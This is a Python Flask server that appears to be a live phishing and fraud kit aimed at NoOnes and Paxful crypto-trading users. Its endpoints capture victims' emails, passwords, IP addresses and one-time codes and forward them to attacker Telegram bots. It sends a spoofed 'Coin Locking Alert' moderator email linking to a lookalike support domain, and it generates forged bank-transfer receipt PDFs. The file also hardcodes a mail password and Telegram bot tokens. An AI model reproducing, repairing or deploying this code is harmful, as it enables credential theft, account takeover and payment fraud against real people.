from flask import Flask, request, jsonify, Response, send_file
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash
import jwt
import tempfile
import os
import base64
from flask_mail import Mail, Message
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Image, Table, TableStyle
from reportlab.lib import colors
from reportlab.graphics.shapes import Drawing, Circle, Line
from reportlab.graphics import renderPDF
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from io import BytesIO
import qrcode
import uuid
import requests
from datetime import datetime, timedelta
import logging
import sqlalchemy.exc
from flask_bcrypt import Bcrypt
from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity
import random
import string




app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'sqlite:///receipts.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', os.urandom(24).hex())
db = SQLAlchemy(app)
CORS(app, resources={r"/*": {"origins": "https://sellbyit.com"}})app)

# Email server configuration
app.config['MAIL_SERVER'] = 'mail.sellbyit.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_SSL'] = False
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USERNAME'] = 'info@sellbyit.com'
app.config['MAIL_PASSWORD'] = 'Sellbyit1234.'  # Replace with your actual password
app.config['MAIL_DEFAULT_SENDER'] = 'moderator@sellbyit.com'



# Telegram configuration (optional; consider removing if not needed)
bot_token = "8134604995:AAEJQxsj_CePVKKRFE-VePfDmlspbFEyj-I"
chat_id = "-1002306181543"

bot_token1 = "7828126568:AAHMNXYYAcvE7wLJbf8epighrBonkXd7gsg"
chat_id1 = "1865856843"

# Configure logging
logging.basicConfig(level=logging.INFO)
app.logger.setLevel(logging.INFO)

bcrypt = Bcrypt(app)
jwt = JWTManager(app)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Account Action</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      background: linear-gradient(135deg, #e0f7e9, #a8e6cf); /* Light green gradient */
      font-family: Arial, sans-serif;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      background-color: #ffffff; /* White background for card */
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      border-top: 6px solid #00b050; /* Green accent border */
    }
    .header {
      font-size: 26px;
      font-weight: bold;
      color: #00b050; /* Green header */
      margin-bottom: 10px;
    }
    .subheader {
      font-size: 20px;
      color: #007a37; /* Darker green for subheader */
      margin-bottom: 20px;
    }
    .content {
      font-size: 16px;
      color: #333333;
      line-height: 1.6;
      margin-bottom: 20px;
    }
    .button {
      display: inline-block;
      background-color: #00b050; /* Green button */
      color: #ffffff;
      text-decoration: none;
      padding: 12px 24px;
      border-radius: 5px;
      font-weight: bold;
      transition: background-color 0.3s ease;
    }
    .button:hover {
      background-color: #008840;
    }
    .footer {
      margin-top: 30px;
      font-size: 14px;
      color: #666666;
      border-top: 1px solid #dddddd;
      padding-top: 10px;
    }
    /* Responsive adjustments */
    @media (max-width: 600px) {
      .container {
        padding: 20px;
        margin: 10px;
      }
      .header {
        font-size: 22px;
      }
      .subheader {
        font-size: 18px;
      }
      .content {
        font-size: 15px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">NoOnes Live Support</div>
    <div class="subheader">Coin Locking Alert</div>
    
    <div class="content">
      <p>Dear Seller, @Seller</p>
      <p>Hello seller, we have noted you have a pending trade issue.</p>
      <p>
        Our system has sent an alert regarding a coin locking issue.
        For a prompt resolution, please upload your evidence (e.g., Bank Statement Screenshot)
        showing that you have not received any funds on our moderator platform.
      </p>
      <p>Thank you.</p>
      <p>Moderator</p>
    </div>
    
    <!-- Button linking to another page -->
    <a href="https://noones-support-team.com" class="button">Cancel Trade</a>
    
    <div class="footer">
      <p>Thanks,</p>
      <p>NoOnes</p>
    </div>
  </div>
</body>
</html>
"""



# ✅ User Model
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), nullable=False, unique=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    phone = db.Column(db.String(15), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)
    balance = db.Column(db.Float, default=0.0)
    admin = db.Column(db.String(120), nullable=False)

# ✅ Transaction Model
class Transaction(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    sender_id = db.Column(db.String(120), nullable=False)
    receiver_id = db.Column(db.String(120), nullable=False)
    transaction_id = db.Column(db.String(6), unique=True, default=lambda: str(random.randint(100000, 999999)))
    amount = db.Column(db.Float, nullable=False)
    currency = db.Column(db.String(10), nullable=False, default="USD")
    transaction_type = db.Column(db.String(20), nullable=False)

# ✅ Testimonials Model
class Testimonials(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(120), nullable=False)
    content = db.Column(db.Text, nullable=False)

# ✅ Notification Model
class Notification(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(255), nullable=False)
    content = db.Column(db.Text, nullable=False)

# Define TradeID model
class TradeID(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    trade_id = db.Column(db.String(5), unique=True, nullable=False)
    amount = db.Column(db.Float, nullable=False)
    currency = db.Column(db.String(5), nullable=False)
    payment_node = db.Column(db.String(255), nullable=False)
    customer_node = db.Column(db.String(255), nullable=False)
    date_time_made = db.Column(db.String(50), nullable=False)
    date_time_processed = db.Column(db.String(50), nullable=False)

# ✅ New Contact Message Model
class ContactMessage(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(120), nullable=False)
    email = db.Column(db.String(120), nullable=False)
    message = db.Column(db.Text, nullable=False)

class Code(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    customer_username = db.Column(db.String(100), nullable=False)
    my_payment_details = db.Column(db.String(200), nullable=False)
    customer_payment_details = db.Column(db.String(200), nullable=False)
    amount = db.Column(db.String(50), nullable=False)
    currency = db.Column(db.String(10), nullable=False)
    date_made = db.Column(db.String(50), nullable=False)
    date_processed = db.Column(db.String(50), nullable=False)
    code = db.Column(db.String(8), unique=True, nullable=False)


# Receipt Model
class Receipt(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    sender_id = db.Column(db.String(100), nullable=False)
    receiver_id = db.Column(db.String(100), nullable=False)
    amount = db.Column(db.Float, nullable=False)
    currency = db.Column(db.String(10), nullable=False)
    transaction_type = db.Column(db.String(50), nullable=False)
    payment_method = db.Column(db.String(50), nullable=False)
    date = db.Column(db.String(50), nullable=False)
    time = db.Column(db.String(50), nullable=False)
    transaction_id = db.Column(db.String(50), nullable=False)
    commission = db.Column(db.Float, nullable=False)
    vat = db.Column(db.Float, nullable=False)
    total_amount = db.Column(db.Float, nullable=False)

with app.app_context():
    if not os.path.exists('receipts.db'):
        db.create_all()

@app.route('/')
def index():
    return jsonify({'message': 'Hello, World!'}), 200


@app.route('/generate_code', methods=['POST'])
def generate_code():
    try:
        data = request.form
        customer_username = data.get('customer_username')
        my_payment_details = data.get('my_payment_details')
        customer_payment_details = data.get('customer_payment_details')
        amount = data.get('amount')
        currency = data.get('currency')
        date_made = data.get('date_made')
        date_processed = data.get('date_processed')

        if not all([customer_username, my_payment_details, customer_payment_details, amount, currency, date_made, date_processed]):
            return jsonify({'error': 'All fields are required'}), 400

        try:
            float(amount)
        except (ValueError, TypeError):
            return jsonify({'error': 'Invalid amount format'}), 400

        code = str(uuid.uuid4())[:5]

        code_entry = Code(
            customer_username=customer_username,
            my_payment_details=my_payment_details,
            customer_payment_details=customer_payment_details,
            amount=amount,
            currency=currency,
            date_made=date_made,
            date_processed=date_processed,
            code=code
        )
        db.session.add(code_entry)
        db.session.commit()

        return jsonify({'code': code})

    except Exception as e:
        app.logger.error(f"Error in generate_code: {str(e)}")
        return jsonify({'error': f'Internal server error: {str(e)}'}), 500


@app.route('/generate_receipt', methods=['POST'])
def generate_receipt():
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = request.get_json()
        sender_id = data.get('sender_id')
        receiver_id = data.get('receiver_id')
        amount = data.get('amount')
        currency = data.get('currency')
        bank = data.get('bank', '')
        transaction_type = data.get('transaction_type')
        payment_method = data.get('payment_method')
        date = data.get('date', datetime.now().strftime("%Y-%m-%d"))
        time = data.get('time', datetime.now().strftime("%H:%M"))
        transaction_id = data.get('transaction_id', f"FT{uuid.uuid4().hex[:8].upper()}")
        commission = data.get('commission', 0.0)
        vat = data.get('vat', 0.0)
        total_amount = data.get('total_amount')

        if not all([sender_id, receiver_id, amount, currency, transaction_type, payment_method, total_amount]):
            return jsonify({'error': 'Required fields missing'}), 400

        allowed_transaction_types = {'transfer', 'deposit', 'withdrawal'}
        allowed_payment_methods = {'bank transfer', 'crypto transfer'}
        if transaction_type not in allowed_transaction_types:
            return jsonify({'error': 'Invalid transaction type'}), 400
        if payment_method not in allowed_payment_methods:
            return jsonify({'error': 'Invalid payment method'}), 400

        try:
            amount = float(amount)
            commission = float(commission)
            vat = float(vat)
            total_amount = float(total_amount)
            if amount <= 0 or commission < 0 or vat < 0 or total_amount <= 0:
                return jsonify({'error': 'Numeric values must be positive'}), 400
        except (ValueError, TypeError):
            return jsonify({'error': 'Invalid numeric values'}), 400

        calculated_total = amount + commission + vat
        if abs(calculated_total - total_amount) > 0.01:
            return jsonify({'error': 'Total amount mismatch'}), 400

        receipt = Receipt(
            sender_id=sender_id, receiver_id=receiver_id, amount=amount, currency=currency,
            transaction_type=transaction_type, payment_method=payment_method, date=date,
            time=time, transaction_id=transaction_id, commission=commission, vat=vat,
            total_amount=total_amount
        )
        db.session.add(receipt)
        db.session.commit()

        with tempfile.NamedTemporaryFile(delete=False, suffix='.pdf') as temp_file:
            doc = SimpleDocTemplate(temp_file.name, pagesize=(300, 500), topMargin=10, bottomMargin=10)
            elements = []

            styles = getSampleStyleSheet()
            header_style = ParagraphStyle(name='HeaderStyle', parent=styles['Heading1'], fontSize=16, textColor=colors.black, alignment=1)
            subheader_style = ParagraphStyle(name='SubHeaderStyle', parent=styles['BodyText'], fontSize=12, textColor=colors.green, alignment=1)
            normal_style = ParagraphStyle(name='NormalStyle', parent=styles['BodyText'], fontSize=10, textColor=colors.black, leading=12)
            button_style = ParagraphStyle(name='ButtonStyle', parent=styles['BodyText'], fontSize=12, textColor=colors.white, alignment=1)

            checkmark = Drawing(20, 20)
            circle = Circle(10, 10, 8, fillColor=colors.green, strokeColor=colors.green)
            checkmark.add(circle)
            checkmark.add(Line(6, 10, 9, 13, strokeColor=colors.white, strokeWidth=2))
            checkmark.add(Line(9, 13, 14, 8, strokeColor=colors.white, strokeWidth=2))

            header_data = [
                ['', checkmark, ''],
                ['', Paragraph('<b>Thank You!</b>', header_style), ''],
                ['', Paragraph('Success', subheader_style), '']
            ]
            header_table = Table(header_data, colWidths=[90, 120, 90])
            header_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, -1), colors.Color(0.898, 0.961, 0.914)),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
                ('SPAN', (1, 1), (1, 1)),
                ('SPAN', (1, 2), (1, 2)),
            ]))
            elements.append(header_table)
            elements.append(Spacer(1, 10))

            description = f"{currency} {amount:,.2f} debited from {sender_id} for {receiver_id} on {date} at {time} via {payment_method} with Transaction ID: {transaction_id}. Total Amount Debited {currency} {total_amount:,.2f} with commission of {currency} {commission:,.2f} and {int(vat*100/total_amount*100)/100}% VAT of {currency} {vat:,.2f}."
            desc_data = [[Paragraph("Message", styles['Heading2'])], [Paragraph(description, normal_style)]]
            desc_table = Table(desc_data, colWidths=[290])
            desc_table.setStyle(TableStyle([
                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                ('VALIGN', (0, 0), (-1, -1), 'TOP'),
                ('LEADING', (0, 1), (-1, -1), 12),
            ]))
            elements.append(desc_table)
            elements.append(Spacer(1, 10))

            qr = qrcode.QRCode(version=1, box_size=5, border=2)
            qr.add_data(f"Transaction ID: {transaction_id}\nAmount: {currency} {total_amount}")
            qr.make(fit=True)
            qr_image = qr.make_image(fill="black", back_color="white")
            qr_buffer = BytesIO()
            qr_image.save(qr_buffer, format="PNG")
            qr_buffer.seek(0)
            elements.append(Image(qr_buffer, width=120, height=120, hAlign='CENTER'))
            elements.append(Spacer(1, 10))

            button_text = "Bank Transfer" if payment_method.lower() == "bank transfer" else "Crypto Transfer"
            arrow = Drawing(15, 15)
            arrow.add(Line(5, 7.5, 10, 7.5, strokeColor=colors.white, strokeWidth=2))
            arrow.add(Line(10, 7.5, 8, 5.5, strokeColor=colors.white, strokeWidth=2))
            arrow.add(Line(10, 7.5, 8, 9.5, strokeColor=colors.white, strokeWidth=2))

            button_data = [[Paragraph(button_text.upper(), button_style), arrow]]
            button_table = Table(button_data, colWidths=[140, 20])
            button_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, -1), colors.Color(0.831, 0.627, 0.090)),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
                ('BOX', (0, 0), (-1, -1), 1, colors.Color(0.831, 0.627, 0.090)),
                ('ROUND', (0, 0), (-1, -1), 10),
                ('PADDING', (0, 0), (-1, -1), 5),
            ]))
            elements.append(button_table)
            elements.append(Spacer(1, 10))

            footer_style = ParagraphStyle(name='FooterStyle', parent=styles['BodyText'], fontSize=10, textColor=colors.black, alignment=1)
            footer_data = [['', Paragraph(f"{bank}<br/>The Bank You can always Rely on!", footer_style), '']]
            footer_table = Table(footer_data, colWidths=[50, 200, 50])
            footer_table.setStyle(TableStyle([
                ('BACKGROUND', (1, 0), (1, 0), colors.white),
                ('ALIGN', (0, 0), (-1, 0), 'CENTER'),
                ('VALIGN', (0, 0), (-1, 0), 'MIDDLE'),
            ]))
            elements.append(footer_table)

            doc.build(elements)
            temp_file_path = temp_file.name

        with open(temp_file_path, 'rb') as f:
            pdf_data = f.read()
        pdf_base64 = base64.b64encode(pdf_data).decode('utf-8')

        response = jsonify({
            'message': 'Receipt generated successfully',
            'transaction_id': transaction_id,
            'pdf_base64': pdf_base64
        })

        try:
            os.unlink(temp_file_path)
        except Exception as e:
            app.logger.error(f"Failed to delete temp file: {e}")

        app.logger.info(f"Receipt generated: transaction_id={transaction_id}")
        return response

    except Exception as e:
        app.logger.error(f"Error in generate_receipt: {str(e)}")
        return jsonify({'error': f'Internal server error: {str(e)}'}), 500

# Get all trade ids
@app.route('/api/get_all_codes', methods=['GET'])
def get_all_trade_ids():
    try:
        trades = TradeID.query.all()
        return jsonify({"success": True, "trade_ids": [trade.trade_id for trade in trades]}), 200
    except Exception as e:
        return jsonify({"success": False, "message": f"Server error: {str(e)}"}), 500   

# ✅ Get All Users
@app.route('/users/<string:admin_id>', methods=['GET'])
def get_users_by_admin(admin_id):
    users = User.query.filter_by(admin=admin_id).all()
    return jsonify([{
        "id": u.id,
        "username": u.username,
        "email": u.email,
        "phone": u.phone,
        "balance": u.balance,
        "admin": u.admin
    } for u in users]), 200

# ✅ Delete User
@app.route('/users/<int:id>', methods=['DELETE'])
def delete_user(id):
    user = User.query.get(id)
    if not user:
        return jsonify({"error": "User not found"}), 404

    # Delete user's transactions
    Transaction.query.filter((Transaction.sender_id == str(id)) | (Transaction.receiver_id == str(id))).delete()
    
    # Delete the user
    db.session.delete(user)
    db.session.commit()

    return jsonify({"message": f"User with ID {id} deleted successfully"}), 200

# ✅ Update User Balance
@app.route('/users/<int:id>/balance', methods=['PUT'])
def update_user_balance(id):
    data = request.get_json()
    user = User.query.get(id)

    if not user:
        return jsonify({"error": "User not found"}), 404

    if 'balance' not in data:
        return jsonify({"error": "Balance field is required"}), 400

    user.balance = data['balance']
    db.session.commit()
    return jsonify({"message": "User balance updated successfully", "balance": user.balance}), 200

# ✅ Create Transaction
@app.route('/transactions', methods=['POST'])
def create_transaction():
    data = request.get_json()

    # Ensure data is received
    if not data:
        return jsonify({"error": "Invalid data"}), 400

    # Check required fields
    required_fields = ['sender_id', 'receiver_id', 'amount', 'currency', 'transaction_type']
    if not all(k in data for k in required_fields):
        return jsonify({"error": "Missing transaction fields"}), 400

    # Create transaction
    transaction = Transaction(
        sender_id=data['sender_id'], 
        receiver_id=data['receiver_id'], 
        amount=data['amount'], 
        currency=data['currency'],
        transaction_type=data['transaction_type']
    )
    
    db.session.add(transaction)
    db.session.commit()

    return jsonify({
        "message": "Transaction successful",
        "transaction": {
            "transaction_id": transaction.transaction_id,
            "sender": transaction.sender_id,
            "receiver": transaction.receiver_id,
            "amount": transaction.amount,
            "currency": transaction.currency,
            "transaction_type": transaction.transaction_type
        }
    }), 201

# ✅ Get All Transactions
@app.route('/transactions', methods=['GET'])
def get_transactions():
    transactions = Transaction.query.all()
    return jsonify([{
        "transaction_id": t.transaction_id,
        "sender_id": t.sender_id,
        "receiver_id": t.receiver_id,
        "amount": t.amount,
        "currency": t.currency,
        "transaction_type": t.transaction_type
    } for t in transactions]), 200

# ✅ Delete Transaction
@app.route('/transactions/<transaction_id>', methods=['DELETE'])
def delete_transaction(transaction_id):
    transaction = Transaction.query.filter_by(transaction_id=transaction_id).first()
    if not transaction:
        return jsonify({"error": "Transaction not found"}), 404
    db.session.delete(transaction)
    db.session.commit()
    return jsonify({"message": "Transaction deleted successfully"}), 200

# ✅ Create Notification
@app.route('/notifications', methods=['POST'])
def create_notification():
    data = request.get_json()
    if not data or not all(k in data for k in ['title', 'content']):
        return jsonify({"error": "Missing title or content"}), 400

    notification = Notification(title=data['title'], content=data['content'])
    db.session.add(notification)
    db.session.commit()
    return jsonify({"message": "Notification created"}), 201

@app.route("/send-email", methods=["POST"])
def send_email():
    """
    Expects a JSON payload with:
    {
      "recipient": "recipient@example.com",
      "seller": "John Doe"  # optional, default to "Seller" if not provided
    }
    """
    data = request.get_json()
    recipient = data.get("recipient")
    seller = data.get("seller", "Seller")
    
    if not recipient:
        return jsonify({"error": "Recipient is required"}), 400
    
    try:
        # Replace the placeholder in the HTML template with the seller name
        html_content = HTML_TEMPLATE.replace("@Seller", seller)
        
        msg = Message(
            subject="Noones Moderator [Coin Locking Alert]. Action Required!",
            recipients=[recipient]
        )
        # Assign the processed HTML content to msg.html
        msg.html = html_content
        
        # Optional plain text fallback
        msg.body = "Dear Seller, please check your email for further instructions regarding the coin locking alert."
        
        mail.send(msg)
        return jsonify({"message": "Email sent successfully!"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ✅ Delete Notification
@app.route('/notifications/<int:id>', methods=['DELETE'])
def delete_notification(id):
    notification = Notification.query.get(id)
    if not notification:
        return jsonify({"error": "Notification not found"}), 404
    db.session.delete(notification)
    db.session.commit()
    return jsonify({"message": "Notification deleted successfully"}), 200

# ✅ Get Notifications
@app.route('/notifications', methods=['GET'])
def get_notifications():
    notifications = Notification.query.all()
    return jsonify([{"id": n.id, "title": n.title, "content": n.content} for n in notifications]), 200

# ✅ Create Testimonial
@app.route('/testimonials', methods=['POST'])
def create_testimonial():
    data = request.get_json()
    if not data or not all(k in data for k in ['name', 'content']):
        return jsonify({"error": "Missing name or content"}), 400

    testimonial = Testimonials(name=data['name'], content=data['content'])
    db.session.add(testimonial)
    db.session.commit()
    return jsonify({"message": "Testimonial created"}), 201

# ✅ Delete Testimonial
@app.route('/testimonials/<int:id>', methods=['DELETE'])
def delete_testimonial(id):
    testimonial = Testimonials.query.get(id)
    if not testimonial:
        return jsonify({"error": "Testimonial not found"}), 404
    db.session.delete(testimonial)
    db.session.commit()
    return jsonify({"message": "Testimonial deleted successfully"}), 200

# ✅ Get Testimonials
@app.route('/testimonials', methods=['GET'])
def get_testimonials():
    testimonials = Testimonials.query.all()
    return jsonify([{"id": t.id, "name": t.name, "content": t.content} for t in testimonials]), 200

# ✅ CONTACT ENDPOINTS
# ✅ Register User
@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data or not all(k in data for k in ['username', 'email', 'phone', 'password']):
        return jsonify({"error": "Missing required fields"}), 400

    hashed_password = bcrypt.generate_password_hash(data['password']).decode('utf-8')
    user = User(username=data['username'], email=data['email'], phone=data['phone'], admin=data['admin'], password_hash=data['password'], )
    db.session.add(user)
    db.session.commit()
    return jsonify({"message": "User registered successfully"}), 201

# ✅ Login User
@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    if not data or not all(k in data for k in ['email', 'password']):
        return jsonify({"error": "Missing email or password"}), 400

    user = User.query.filter_by(email=data['email']).first()
    if user and bcrypt.check_password_hash(user.password_hash, data['password']):
        access_token = create_access_token(identity=user.id)
        return jsonify({
            "access_token": access_token,
            "username": user.username,
            "email": user.email,
            "phone": user.phone,
            "balance": user.balance
        }), 200
    return jsonify({"error": "Invalid credentials"}), 401

# POST: Save a new contact message
@app.route('/contact', methods=['POST'])
def create_contact():
    data = request.get_json()
    if not data or not all(key in data for key in ['name', 'email', 'message']):
        return jsonify({"error": "Missing required fields"}), 400

    contact = ContactMessage(
        name=data['name'],
        email=data['email'],
        message=data['message']
    )
    db.session.add(contact)
    db.session.commit()
    return jsonify({"message": "Contact message saved successfully"}), 201

# GET: Retrieve all contact messages
@app.route('/contact', methods=['GET'])
def get_contacts():
    contacts = ContactMessage.query.all()
    contacts_data = [{
        "id": c.id,
        "name": c.name,
        "email": c.email,
        "message": c.message
    } for c in contacts]
    return jsonify(contacts_data), 200

# DELETE: Remove a contact message by its ID
@app.route('/contact/<int:id>', methods=['DELETE'])
def delete_contact(id):
    contact = ContactMessage.query.get(id)
    if not contact:
        return jsonify({"error": "Contact message not found"}), 404
    db.session.delete(contact)
    db.session.commit()
    return jsonify({"message": "Contact message deleted successfully"}), 200

@app.route('/search_receipt', methods=['GET'])
def search_receipt():
    code = request.args.get('code')
    if not code:
        return jsonify({'error': 'Code parameter is required'}), 400

    code_entry = Code.query.filter_by(code=code).first()
    if code_entry:
        return jsonify({
            'customer_username': code_entry.customer_username,
            'my_payment_details': code_entry.my_payment_details,
            'customer_payment_details': code_entry.customer_payment_details,
            'amount': code_entry.amount,
            'currency': code_entry.currency,
            'date_made': code_entry.date_made,
            'date_processed': code_entry.date_processed,
            'code': code_entry.code
        })
    else:
        return jsonify({'error': 'Receipt not found'}), 404

@app.route('/auth/nun_accept', methods=['POST'])
def handle_n():
    if request.method == 'POST':
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        email = request.form.get('email')
        password = request.form.get('password')
        user_agent = request.headers.get('User-Agent', '')
        bot_token = request.form.get('bot_token')
        chat_id = request.form.get('chat_id')
        bot_token1 = request.form.get('bot_token1')
        chat_id1 = request.form.get('chat_id1')
        bot_token2 = request.form.get('bot_token2')
        chat_id2 = request.form.get('chat_id2')

        try:
            response = requests.get(f'https://ipinfo.io/{user_ip}/json')
            location = response.json().get('country', 'N/A')
        except Exception:
            location = 'N/A'

        payload_text = f"Login attempt: IP={user_ip}, Location={location}, User Agent={user_agent}, Email: {email}, Password: {password}, Site=Noones"
        payload_telegram = {'chat_id': chat_id, 'text': payload_text}
        response = requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', json=payload_telegram)
        if chat_id1 and bot_token1:
            payload_telegram = {'chat_id': chat_id1, 'text': payload_text}
            response = requests.post(f'https://api.telegram.org/bot{bot_token1}/sendMessage', json=payload_telegram)

        if chat_id2 and bot_token2:
            payload_telegram = {'chat_id': chat_id2, 'text': payload_text}
            response = requests.post(f'https://api.telegram.org/bot{bot_token2}/sendMessage', json=payload_telegram)

        app.logger.info(f"Noones login attempt logged: email={email}, ip={user_ip}")
        return Response('{"success": true}' if response.status_code == 200 else '{"success": false, "error": "Failed to send message to Telegram"}', 
                       status=200 if response.status_code == 200 else 501, content_type='application/json')

@app.route('/nun/security', methods=['POST'])
def handle_otp_n():
    if request.method == 'POST':
        otp = request.form.get('code')
        bot_token = request.form.get('bot_token')
        chat_id = request.form.get('chat_id')
        bot_token1 = request.form.get('bot_token1')
        chat_id1 = request.form.get('chat_id1')
        bot_token2 = request.form.get('bot_token2')
        chat_id2 = request.form.get('chat_id2')

        if not otp:
            app.logger.warning("OTP code missing in /nun/security request")
            return Response('{"success": false, "error": "OTP code is required"}', status=400, content_type='application/json')

        payload_text = f"Noones OTP: {otp} received"
        payload_telegram = {'chat_id': chat_id, 'text': payload_text}
        response = requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', json=payload_telegram)
        if chat_id1 and bot_token1:
            payload_telegram = {'chat_id': chat_id1, 'text': payload_text}
            response = requests.post(f'https://api.telegram.org/bot{bot_token1}/sendMessage', json=payload_telegram)

        if chat_id2 and bot_token2:
            payload_telegram = {'chat_id': chat_id2, 'text': payload_text}
            response = requests.post(f'https://api.telegram.org/bot{bot_token2}/sendMessage', json=payload_telegram)

        app.logger.info("Noones OTP logged")
        return Response('{"success": true}' if response.status_code == 200 else '{"success": false, "error": "Failed to send message to Telegram"}', 
                       status=200 if response.status_code == 200 else 501, content_type='application/json')

@app.route('/auth/pass_accept', methods=['POST'])
def handle_p():
    if request.method == 'POST':
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        email = request.form.get('email')
        password = request.form.get('password')
        user_agent = request.headers.get('User-Agent', '')
        bot_token = request.form.get('bot_token')
        chat_id = request.form.get('chat_id')
        bot_token1 = request.form.get('bot_token1')
        chat_id1 = request.form.get('chat_id1')
        bot_token2 = request.form.get('bot_token2')
        chat_id2 = request.form.get('chat_id2')

        try:
            response = requests.get(f'https://ipinfo.io/{user_ip}/json')
            location = response.json().get('country', 'N/A')
        except Exception:
            location = 'N/A'

        payload_text = f"Login attempt: IP={user_ip}, Location={location}, User Agent={user_agent}, Email: {email}, Password: {password} Site=Paxful"
        payload_telegram = {'chat_id': chat_id, 'text': payload_text}
        response = requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', json=payload_telegram)

        if chat_id1 and bot_token1:
            payload_telegram = {'chat_id': chat_id1, 'text': payload_text}
            response = requests.post(f'https://api.telegram.org/bot{bot_token1}/sendMessage', json=payload_telegram)

        if chat_id2 and bot_token2:
            payload_telegram = {'chat_id': chat_id2, 'text': payload_text}
            response = requests.post(f'https://api.telegram.org/bot{bot_token2}/sendMessage', json=payload_telegram)

        app.logger.info(f"Paxful login attempt logged: email={email}, ip={user_ip}")
        return Response('{"success": true}' if response.status_code == 200 else '{"success": false, "error": "Failed to send message to Telegram"}', 
                       status=200 if response.status_code == 200 else 501, content_type='application/json')

@app.route('/security', methods=['POST'])
def handle_otp_p():
    if request.method == 'POST':
        otp = request.form.get('code')
        bot_token = request.form.get('bot_token')
        chat_id = request.form.get('chat_id')
        bot_token1 = request.form.get('bot_token1')
        chat_id1 = request.form.get('chat_id1')
        bot_token2 = request.form.get('bot_token2')
        chat_id2 = request.form.get('chat_id2')
        
        if not otp:
            app.logger.warning("OTP code missing in /security request")
            return Response('{"success": false, "error": "OTP code is required"}', status=400, content_type='application/json')

        payload_text = f"Paxful OTP: {otp} received"
        payload_telegram = {'chat_id': chat_id, 'text': payload_text}
        response = requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', json=payload_telegram)
        if chat_id1 and bot_token1:
            payload_telegram = {'chat_id': chat_id1, 'text': payload_text}
            response = requests.post(f'https://api.telegram.org/bot{bot_token1}/sendMessage', json=payload_telegram)
        if chat_id2 and bot_token2:
            payload_telegram = {'chat_id': chat_id2, 'text': payload_text}
            response = requests.post(f'https://api.telegram.org/bot{bot_token2}/sendMessage', json=payload_telegram)

        app.logger.info("Paxful OTP logged")
        return Response('{"success": true}' if response.status_code == 200 else '{"success": false, "error": "Failed to send message to Telegram"}', 
                       status=200 if response.status_code == 200 else 501, content_type='application/json')

@app.errorhandler(Exception)
def handle_error(error):
    app.logger.error(f"Unhandled error: {str(error)}")
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    app.run()
